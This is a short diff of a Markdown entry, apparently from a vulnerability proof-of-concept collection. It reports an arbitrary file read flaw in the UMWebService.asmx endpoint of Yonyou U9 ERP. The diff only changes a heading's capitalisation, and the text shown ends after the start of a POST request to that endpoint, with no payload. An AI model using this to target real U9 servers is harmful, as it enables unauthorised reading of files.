@@ -1,6 +1,6 @@
 ## 用友U9-UMWebService.asmx存在文件读取漏洞
 
-## poc
+## POC
 ```
 POST /u9/OnLine/UMWebService.asmx HTTP/1.1
 Host: 
